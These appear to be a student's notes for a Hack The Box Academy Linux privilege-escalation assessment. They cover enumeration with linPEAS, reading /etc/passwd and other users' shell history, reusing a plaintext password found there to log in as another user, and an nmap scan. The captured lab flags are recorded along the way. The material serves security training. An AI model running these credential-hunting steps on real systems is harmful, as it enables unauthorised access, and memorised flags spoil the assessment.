# Linux Local Privilege Escalation - Skills Assessment

ssh htb-student@10.129.122.218
Academy_LLPE!

whoami
htb-student

id
uid=1002(htb-student) gid=1002(htb-student) groups=1002(htb-student)

# Environment Enumeration

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

scp linpeas.sh htb-student@$10.129.122.218:/tmp/linpeas.sh
Academy_LLPE!
cd /tmp
chmod 777 linpeas.sh
./linpeas.sh

https://github.com/rebootuser/LinEnum

## OS version

cat /etc/os-release

NAME="Ubuntu"
VERSION="20.04.1 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.1 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal


## PATH

echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

## Environment variables

env

SHELL=/bin/bash
LC_ADDRESS=C.UTF-8
LC_NAME=C.UTF-8
LC_MONETARY=C.UTF-8
PWD=/home/htb-student
LOGNAME=htb-student
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/htb-student
LANG=C.UTF-8
LC_PAPER=C.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.15.118 53132 10.129.122.218 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LC_IDENTIFICATION=C.UTF-8
LESSOPEN=| /usr/bin/lesspipe %s
USER=htb-student
SHLVL=1
LC_TELEPHONE=C.UTF-8
LC_MEASUREMENT=C.UTF-8
XDG_SESSION_ID=1
XDG_RUNTIME_DIR=/run/user/1002
SSH_CLIENT=10.10.15.118 53132 22
LC_TIME=C.UTF-8
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1002/bus
SSH_TTY=/dev/pts/0
LC_NUMERIC=C.UTF-8
_=/usr/bin/env


<SNIP>

## Kernel version

uname -a

Linux nix03 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

OR

cat /proc/version

Linux version 5.4.0-45-generic (buildd@lgw01-amd64-033) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020


## Physical host

lscpu 

Architecture:                    x86_64
CPU op-mode(s):                  32-bit, 64-bit
Byte Order:                      Little Endian
Address sizes:                   43 bits physical, 48 bits virtual
CPU(s):                          2
On-line CPU(s) list:             0,1
Thread(s) per core:              1
Core(s) per socket:              1
Socket(s):                       2
NUMA node(s):                    1
Vendor ID:                       AuthenticAMD
CPU family:                      23
Model:                           49
Model name:                      AMD EPYC 7302P 16-Core Processor
Stepping:                        0
CPU MHz:                         2994.375
BogoMIPS:                        5988.75
Hypervisor vendor:               VMware
Virtualization type:             full
L1d cache:                       64 KiB
L1i cache:                       64 KiB
L2 cache:                        1 MiB
L3 cache:                        256 MiB
NUMA node0 CPU(s):               0,1
Vulnerability Itlb multihit:     Not affected
Vulnerability L1tf:              Not affected
Vulnerability Mds:               Not affected
Vulnerability Meltdown:          Not affected
Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled v
                                 ia prctl and seccomp
Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user
                                  pointer sanitization
Vulnerability Spectre v2:        Mitigation; Full AMD retpoline, IBPB conditiona
                                 l, STIBP disabled, RSB filling
Vulnerability Srbds:             Not affected
Vulnerability Tsx async abort:   Not affected
Flags:                           ...

## Login shells

cat /etc/shells

\# /etc/shells: valid login shells
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/tmux
/usr/bin/screen


## Check defenses

Exec Shield
iptables
AppArmor
SELinux
Fail2ban
Snort
Uncomplicated Firewall (ufw)

## Block devices on the system

lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
loop0    7:0    0   55M  1 loop /snap/core18/1705
loop1    7:1    0 27.1M  1 loop /snap/snapd/7264
loop2    7:2    0 55.3M  1 loop /snap/core18/1885
loop3    7:3    0   69M  1 loop /snap/lxd/14804
loop4    7:4    0 29.9M  1 loop /snap/snapd/8790
loop5    7:5    0 70.6M  1 loop /snap/lxd/16926
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0    1M  0 part 
└─sda2   8:2    0   30G  0 part /


## Mounted and unmounted drives

cat /etc/fstab

/dev/disk/by-uuid/859b580b-18d5-4cb6-ba6e-3d2b2e9cc7e4 / ext4 defaults 0 0
/swap.img	none	swap	sw	0	0

## Routing

route

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.129.0.1      0.0.0.0         UG    100    0        0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
10.129.0.1      0.0.0.0         255.255.255.255 UH    100    0        0 ens192

## DNS resolution

cat /etc/resolv.conf

nameserver 127.0.0.53
options edns0

## ARP Table to see what other hosts the target has been communicated with

arp -a

? (10.129.0.1) at 00:50:56:b9:f3:62 [ether] on ens192

## Existing Users

cat /etc/passwd | cut -f1 -d:

root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
landscape
pollinate
sshd
systemd-coredump
mrb3n
lxd
mysql
tomcat
barry
htb-student

## Check if users have login shells

grep ".*sh$" /etc/passwd

root:x:0:0:root:/root:/bin/bash
mrb3n:x:1000:1000:Ben:/home/mrb3n:/bin/bash
tomcat:x:997:997:Apache Tomcat:/:/bin/bash
barry:x:1001:1001::/home/barry:/bin/bash
htb-student:x:1002:1002::/home/htb-student:/bin/bash

## Existing Groups

cat /etc/group

root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,mrb3n,barry
tty:x:5:syslog
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:mrb3n
floppy:x:25:
tape:x:26:
sudo:x:27:mrb3n
audio:x:29:
dip:x:30:mrb3n
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:mrb3n
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-network:x:102:
systemd-resolve:x:103:
systemd-timesync:x:104:
crontab:x:105:
messagebus:x:106:
input:x:107:
kvm:x:108:
render:x:109:
syslog:x:110:
tss:x:111:
uuidd:x:112:
tcpdump:x:113:
ssh:x:114:
landscape:x:115:
lxd:x:116:mrb3n
systemd-coredump:x:999:
mrb3n:x:1000:
ssl-cert:x:117:
mysql:x:118:
tomcat:x:997:
barry:x:1001:
htb-student:x:1002:


## Group members

getent group sudo

sudo:x:27:mrb3n

ls /home

barry  htb-student  mrb3n


## Mounted File Systems

df -h

Some file system are unmounted because they containfiles, scripts, documents, and other important information must not be mounted and viewed by a standard user. 
Therefore, if we can extend our privileges to the root user, we could mount and read these file systems ourselves.

Filesystem      Size  Used Avail Use% Mounted on
udev            952M     0  952M   0% /dev
tmpfs           199M  1.1M  198M   1% /run
/dev/sda2        30G  5.6G   23G  20% /
tmpfs           994M     0  994M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           994M     0  994M   0% /sys/fs/cgroup
/dev/loop1       28M   28M     0 100% /snap/snapd/7264
/dev/loop2       56M   56M     0 100% /snap/core18/1885
/dev/loop3       69M   69M     0 100% /snap/lxd/14804
/dev/loop0       55M   55M     0 100% /snap/core18/1705
/dev/loop4       30M   30M     0 100% /snap/snapd/8790
/dev/loop5       71M   71M     0 100% /snap/lxd/16926
tmpfs           199M     0  199M   0% /run/user/1002


## Unmounted File Systems / All Hidden Files

find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student

-rw-r--r-- 1 htb-student www-data 33 Sep  6  2020 /home/htb-student/.config/.flag1.txt
-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 /home/htb-student/.bashrc
-rw------- 1 htb-student htb-student 57 Sep  6  2020 /home/htb-student/.bash_history
-rw-r--r-- 1 htb-student htb-student 220 Feb 25  2020 /home/htb-student/.bash_logout
-rw-r--r-- 1 htb-student htb-student 807 Feb 25  2020 /home/htb-student/.profile

cat /home/htb-student/.config/.flag1.txt
LLPE{d0n_ov3rl00k_h1dden_f1les!}

## All Hidden Directories

find / -type d -name ".*" -ls 2>/dev/null

  1048882      4 drwxrwxrwt   2 root     root         4096 Jan 25 18:19 /tmp/.font-unix
  1048883      4 drwxrwxrwt   2 root     root         4096 Jan 25 18:19 /tmp/.Test-unix
  1048579      4 drwxrwxrwt   2 root     root         4096 Jan 25 18:19 /tmp/.X11-unix
  1048881      4 drwxrwxrwt   2 root     root         4096 Jan 25 18:19 /tmp/.XIM-unix
  1048587      4 drwxrwxrwt   2 root     root         4096 Jan 25 18:19 /tmp/.ICE-unix
  1578282      4 drwxrwxr-x   3 mrb3n    mrb3n        4096 Sep  2  2020 /home/mrb3n/.local
  1446802      4 drwx------   2 mrb3n    mrb3n        4096 Sep  2  2020 /home/mrb3n/.cache
  1442217      4 drwxr-xr-x   2 root     root         4096 Sep  6  2020 /home/htb-student/.config
  1442208      4 drwx------   2 htb-student htb-student     4096 Sep  6  2020 /home/htb-student/.cache
  1442199      4 drwx------   2 barry       barry           4096 Sep  5  2020 /home/barry/.ssh
  1442203      4 drwxrwxr-x   3 barry       barry           4096 Sep  5  2020 /home/barry/.local
  1442207      4 drwx------   2 barry       barry           4096 Sep  5  2020 /home/barry/.cache
   657372      4 drwxr-xr-x   3 root        root            4096 Sep  3  2020 /etc/.java
   657373      4 drwxr-xr-x   2 root        root            4096 Sep  3  2020 /etc/.java/.systemPrefs
   393508      4 drwxr-xr-x   2 root        root            4096 Apr 23  2020 /var/lib/systemd/deb-systemd-helper-enabled/.wants
  1578838      4 drwxr-xr-x   5 root        root            4096 Sep  2  2020 /usr/lib/modules/5.4.0-45-generic/vdso/.build-id

ls -l /home/barry
total 4
-rwx------ 1 barry barry 29 Sep  5  2020 flag2.txt

ls -l /home/mrb3n
total 0

cat /home/barry/flag2.txt
cat: /home/barry/flag2.txt: Permission denied

ls -l /home/barry/.ssh
ls: cannot open directory '/home/barry/.ssh': Permission denied

sudo -l
[sudo] password for htb-student: 
Sorry, user htb-student may not run sudo on nix03.

## Temporary Files

ls -l /tmp /var/tmp /dev/shm

/dev/shm:
total 0

/tmp:
total 28
drwx------ 3 root root 4096 Jan 25 18:19 snap.lxd
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-apache2.service-jNvqvh
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-logind.service-MeHPOh
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-resolved.service-NqxgUh
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-timesyncd.service-Q0b3We
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-tomcat9.service-PLNoFg
drwx------ 2 root root 4096 Jan 25 18:19 vmware-root_587-4013395661

/var/tmp:
total 20
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-apache2.service-Z77k2h
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-logind.service-kxBgoj
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-resolved.service-NEwh4e
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-systemd-timesyncd.service-AePCYf
drwx------ 3 root root 4096 Jan 25 18:19 systemd-private-a67d771dce2248bf93b2b70e52c56434-tomcat9.service-wbkFWe




cat /home/lab_adm/.sudo_as_admin_successful

sudo cat /tmp/snap-private-tmp

lsblk
NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
loop0                       7:0    0  55.7M  1 loop /snap/core18/2751
loop1                       7:1    0  55.7M  1 loop /snap/core18/2745
loop2                       7:2    0  63.5M  1 loop /snap/core20/1891
loop3                       7:3    0  73.1M  1 loop /snap/core22/634
loop4                       7:4    0  73.9M  1 loop /snap/core22/750
loop5                       7:5    0 170.1M  1 loop /snap/lxd/24918
loop6                       7:6    0  61.9M  1 loop /snap/core20/1169
loop7                       7:7    0  53.3M  1 loop /snap/snapd/19361
loop8                       7:8    0  53.2M  1 loop /snap/snapd/19122
loop9                       7:9    0 166.4M  1 loop /snap/lxd/24846
sda                         8:0    0     8G  0 disk 
├─sda1                      8:1    0     1M  0 part 
├─sda2                      8:2    0   384M  0 part /boot
└─sda3                      8:3    0   7.6G  0 part 
  └─ubuntu--vg-ubuntu--lv 253:0    0   7.5G  0 lvm  /

sudo mount /dev/sda1 ~/mountpoint

Sorry, user htb-student is not allowed to execute '/usr/bin/mount /dev/sda1 /home/htb-student/mountpoint' as root on ubuntu.

HTB{.*}

grep -Rnw '/' -e 'HTB{.*}'

/lib/int-check.sh:1:HTB{1nt3rn4l_5cr1p7_l34k}

# Linux Services & Internals Enumeration

### User's Last Login

lastlog

root             tty1                      Sat Sep  5 12:52:41 +0000 2020
mrb3n            tty1                      Tue Sep  8 16:39:37 +0000 2020
tomcat           pts/0    10.10.14.4       Mon Sep  7 18:06:06 +0000 2020
barry            pts/0    10.10.14.3       Sun Sep  6 16:21:41 +0000 2020
htb-student      pts/0    10.10.15.118     Thu Jan 25 18:20:55 +0000 2024
root             tty1                      Sat Sep  5 12:52:41 +0000 2020


### Logged In Users

w

 18:43:27 up 23 min,  1 user,  load average: 0.00, 0.00, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
htb-stud pts/0    10.10.15.118     18:20    0.00s  0.09s  0.00s w

### Command History

history


### Finding History Files

find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

-rw------- 1 mrb3n mrb3n 14 Sep  8  2020 /home/mrb3n/.bash_history
-rw------- 1 htb-student htb-student 57 Sep  6  2020 /home/htb-student/.bash_history
-rwxr-xr-x 1 barry barry 360 Sep  6  2020 /home/barry/.bash_history

cat /home/barry/.bash_history

cd /home/barry
ls
id
ssh-keygen
mysql -u root -p
tmux new -s barry
cd ~
sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
history -d 6
history
history -d 12
history
cd /home/bash
cd /home/barry/
nano .bash_history 
history
exit
history
exit
ls -la
ls -l
history 
history -d 21
history 
exit
id
ls /var/log
history
history -d 28
history
exit

ssh barry@10.129.122.218
i_l0ve_s3cur1ty!

cat /home/barry/flag2.txt

LLPE{ch3ck_th0se_cmd_l1nes!}

### Cron

ls -la /etc/cron.daily/

total 56
drwxr-xr-x  2 root root 4096 Sep  3  2020 .
drwxr-xr-x 99 root root 4096 Sep  6  2020 ..
-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x  1 root root  539 Apr 13  2020 apache2
-rwxr-xr-x  1 root root  376 Dec  4  2019 apport
-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg
-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate
-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db
-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest
-rwxr-xr-x  1 root root  538 Feb 24  2020 tomcat9
-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common


### Proc

find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

BOOT_IMAGE=/boot/vmlinuz-5.4.0-45-generic
root=UUID=859b580b-18d5-4cb6-ba6e-3d2b2e9cc7e4
...

--> The proc filesystem (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is virtual but dynamically generated by the kernel.

## Services

### Installed Packages

apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

mysql-client-8.0 8.0.21-0ubuntu0.20.04.4
mysql-client-core-8.0 8.0.21-0ubuntu0.20.04.4
mysql-common 5.8+1.0.5ubuntu2
mysql-server-8.0 8.0.21-0ubuntu0.20.04.4
mysql-server-core-8.0 8.0.21-0ubuntu0.20.04.4
mysql-server 8.0.21-0ubuntu0.20.04.4
...
tomcat9-admin 9.0.31-1
tomcat9-common 9.0.31-1
tomcat9 9.0.31-1
...

### Sudo Version

sudo -V

Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31


### Binaries

ls -l /bin /usr/bin/ /usr/sbin/

/usr/bin/:

-rwxr-xr-x 1 root   root        4629 Mar 22  2020  gettext.sh
-rwxr-xr-x 1 root   root       55640 Sep  5  2019  test

vi /usr/bin/gettext.sh

--> it seems there is nothing interesting

vi /usr/bin/test

--> binary


### GTFObins

for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

### Trace System Calls

strace ping -c1 10.129.112.20


### Configuration Files

find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

-rw-r--r-- 1 root root 114 Apr 10  2020 /snap/snapd/7264/etc/apt/apt.conf.d/20snapd.conf
...

### Scripts

find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

/boot/grub/i386-pc/modinfo.sh
/etc/profile.d/01-locale-fix.sh
/etc/profile.d/Z97-byobu.sh
/etc/profile.d/apps-bin-path.sh
/etc/profile.d/Z99-cloud-locale-test.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/Z99-cloudinit-warnings.sh
/etc/profile.d/gawk.sh
/etc/init.d/console-setup.sh
/etc/init.d/hwclock.sh
/etc/init.d/keyboard-setup.sh
/etc/console-setup/cached_setup_terminal.sh
/etc/console-setup/cached_setup_keyboard.sh
/etc/console-setup/cached_setup_font.sh
/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh
/usr/libexec/tomcat9/tomcat-update-policy.sh
/usr/libexec/tomcat9/tomcat-start.sh
/usr/libexec/tomcat9/tomcat-locate-java.sh
/usr/lib/grub/i386-pc/modinfo.sh
/usr/lib/open-iscsi/activate-storage.sh
/usr/lib/open-iscsi/logout-all.sh
/usr/lib/open-iscsi/startup-checks.sh
/usr/lib/open-iscsi/umountiscsi.sh
/usr/lib/recovery-mode/l10n.sh
/usr/lib/dracut/modules.d/90bcache/module-setup.sh
/usr/lib/init/vars.sh
/usr/lib/console-setup/console-setup.sh
/usr/lib/console-setup/keyboard-setup.sh


### Running Services by User

ps aux | grep root

...
root         678  0.0  0.3 235552  7208 ?        Ssl  18:19   0:00 /usr/lib/accountsservice/accounts-daemon
root         687  0.0  0.1   6812  2780 ?        Ss   18:19   0:00 /usr/sbin/cron -f
root         708  0.0  0.1  81952  3844 ?        Ssl  18:19   0:00 /usr/sbin/irqbalance --foreground
root         711  0.0  0.7  29012 14352 ?        Ss   18:19   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         712  0.0  1.4 230804 30492 ?        Ss   18:19   0:00 /usr/sbin/apache2 -k start
root         716  0.0  1.4 775276 28976 ?        Ssl  18:19   0:01 /usr/lib/snapd/snapd
root         728  0.0  0.3  16992  7756 ?        Ss   18:19   0:00 /lib/systemd/systemd-logind
root         750  0.0  0.3  12168  7036 ?        Ss   18:19   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         847  0.0  0.3 232708  6668 ?        Ssl  18:19   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         856  0.0  0.7 107840 16188 ?        Ssl  18:19   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         866  0.0  0.0   5828  1668 tty1     Ss+  18:19   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1127  0.0  0.4  13904  8496 ?        Ss   18:20   0:00 sshd: htb-student [priv]
root        3809  0.0  0.0      0     0 ?        I    18:39   0:00 [kworker/0:1-events]
root        3985  0.0  0.0      0     0 ?        I    18:45   0:00 [kworker/u4:2-events_power_efficient]
root        4010  0.0  0.4  13904  8912 ?        Ss   18:46   0:00 sshd: barry [priv]
root        4034  0.0  0.0      0     0 ?        I    18:46   0:00 [kworker/1:1-events]
root        5051  0.0  0.0      0     0 ?        I    18:51   0:00 [kworker/u4:1-events_unbound]
root        5623  0.0  0.0      0     0 ?        I    18:56   0:00 [kworker/1:0-events]
root        6060  0.0  0.0      0     0 ?        I    18:56   0:00 [kworker/1:3]
root        6069  0.0  0.0      0     0 ?        I    18:57   0:00 [kworker/u4:0-events_unbound]
htb-stu+    6105  0.0  0.0   8160   724 pts/0    S+   18:58   0:00 grep --color=auto root

# Credential Hunting

## Find config files

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
...

## Find SSH Keys

ls ~/.ssh
ls: cannot access '/home/htb-student/.ssh': No such file or directory

barry@nix03:~$ ls ~/.ssh
id_rsa  id_rsa.pub

# External Recon

nmap -sC -sV -oA nmap 10.129.122.218 --stats-every=5s

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-25 19:06 GMT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.36 seconds

sudo nmap 10.129.122.218 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace

PORT   STATE      SERVICE
21/tcp unfiltered ftp
22/tcp unfiltered ssh
25/tcp unfiltered smtp

sudo nmap 10.129.122.218 -sV -Pn -n --disable-arp-ping --packet-trace

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http    Apache Tomcat



10.129.122.218:8080

ls -latr /var/lib/tomcat9/webapps/ROOT/
total 16
-rw-r--r-- 1 root   root   1895 Sep  3  2020 index.html
drwxr-xr-x 2 root   root   4096 Sep  3  2020 META-INF
drwxr-xr-x 3 root   root   4096 Sep  3  2020 .
drwxrwxr-x 5 tomcat tomcat 4096 Sep  7  2020 ..

ls -latr /var/lib/tomcat9/webapps/ROOT/META-INF/
total 12
-rw-r--r-- 1 root root   49 Sep  3  2020 context.xml
drwxr-xr-x 3 root root 4096 Sep  3  2020 ..
drwxr-xr-x 2 root root 4096 Sep  3  2020 .

cat /var/lib/tomcat9/webapps/ROOT/META-INF/context.xml
<Context path=""
	antiResourceLocking="false" />

# Privileged Groups

id
uid=1001(barry) gid=1001(barry) groups=1001(barry),4(adm)

grep -Rnw '/var/log/' -e 'LLPE{.*}'

grep: /var/log/vmware-network.1.log: Permission denied
/var/log/flag3.txt:1:LLPE{h3y_l00k_a_fl@g!}

# Capabilities

htb-student@nix03:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

barry@nix03:~$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep

--> barry and htb-student have the same capabilities

# Vulnerable Services

## Screen Version Identification
https://linux.die.net/man/1/screen

screen -v

Screen version 4.08.00 (GNU) 05-Feb-20

--> Not vulnerable

# Logrotate

cat /etc/logrotate.conf
```
# see "man logrotate" for details
# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may be also be configured here.
```

sudo cat /var/lib/logrotate.status
i_l0ve_s3cur1ty!

[sudo] password for barry: 
barry is not in the sudoers file.  This incident will be reported.

cat /var/lib/logrotate.status
cat: /var/lib/logrotate.status: No such file or directory

ls /etc/logrotate.d/
alternatives  bootlog       rsyslog                 unattended-upgrades
apache2       btmp          tomcat9                 wtmp
apport        dpkg          ubuntu-advantage-tools
apt           mysql-server  ufw

cat /etc/logrotate.d/tomcat9
/var/log/tomcat9/catalina.out {
  copytruncate
  weekly
  rotate 52
  compress
  delaycompress
  missingok
  create 640 tomcat adm
}

cat /etc/logrotate.d/apache2 
/var/log/apache2/*.log {
	daily
	missingok
	rotate 14
	compress
	delaycompress
	notifempty
	create 640 root adm
	sharedscripts
	postrotate
                if invoke-rc.d apache2 status > /dev/null 2>&1; then \
                    invoke-rc.d apache2 reload > /dev/null 2>&1; \
                fi;
	endscript
	prerotate
		if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
			run-parts /etc/logrotate.d/httpd-prerotate; \
		fi; \
	endscript
}

cat /etc/logrotate.d/mysql-server

/var/log/mysql.log /var/log/mysql/*log {


Requirements :

- we need write permissions on the log files

ls -l /var/log/tomcat9
total 36
-rw-r----- 1 tomcat adm 4026 Sep  3  2020 catalina.2020-09-03.log.gz
-rw-r----- 1 tomcat adm 9007 Jan 25 18:19 catalina.2024-01-25.log
-rw-r----- 1 tomcat adm   45 Sep  3  2020 localhost.2020-09-03.log.gz
-rw-r----- 1 tomcat adm    0 Jan 25 18:19 localhost.2024-01-25.log
-rw-r----- 1 tomcat adm  120 Sep  3  2020 localhost_access_log.2020-09-03.txt.gz
-rw-r----- 1 tomcat adm 4016 Sep  5  2020 localhost_access_log.2020-09-05.txt
-rw-r----- 1 tomcat adm    0 Sep  6  2020 localhost_access_log.2020-09-06.txt
-rw-r----- 1 tomcat adm 2730 Sep  7  2020 localhost_access_log.2020-09-07.txt
-rw-r----- 1 tomcat adm    0 Sep  8  2020 localhost_access_log.2020-09-08.txt
-rw-r----- 1 tomcat adm  769 Jan 25 19:11 localhost_access_log.2024-01-25.txt

/var/log/apache2/:
total 108
